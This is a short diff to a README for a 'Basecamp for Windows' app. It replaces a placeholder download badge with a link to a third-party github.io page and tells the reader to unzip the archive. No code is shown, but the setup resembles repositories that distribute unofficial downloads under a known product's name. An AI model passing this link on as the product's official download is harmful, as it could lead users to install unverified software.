@@ -6,7 +6,7 @@ Basecamp for Windows combines project management, task tracking, and team commun
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://basecamp-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
